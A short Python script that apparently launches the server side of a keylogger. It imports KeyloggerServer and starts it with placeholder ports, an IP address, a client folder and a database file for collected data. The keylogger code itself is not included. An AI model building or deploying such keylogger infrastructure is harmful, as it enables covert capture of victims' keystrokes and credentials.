from keylogger_server import KeyloggerServer



call = KeyloggerServer("PORT-1", "PORT-2", "IP_Address", "ClientFolder", "clientDatabase.db")
call.start()

